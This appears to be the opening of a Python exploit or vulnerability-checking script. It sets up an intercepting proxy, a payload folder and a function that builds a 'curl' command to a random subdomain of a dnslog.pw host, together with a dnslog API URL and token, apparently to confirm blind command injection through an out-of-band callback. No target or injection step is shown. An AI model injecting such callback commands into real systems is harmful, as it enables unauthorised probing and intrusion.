import os
import string
import random
import requests

payloadDir = os.getcwd() + "\\payload\\"

proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

headers = {
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
}



def getDNSURL():
    
    letters = string.ascii_letters
    random_letters = ''.join(random.choice(letters) for _ in range(4))

    cmd = f"curl {random_letters}.t4gowuh9.dnslog.pw"
    dnsAPI = f'http://dnslog.pw/api/dns/t4gowuh9/{random_letters}/?token=7a9f2dc7'
    
    return cmd, dnsAPI
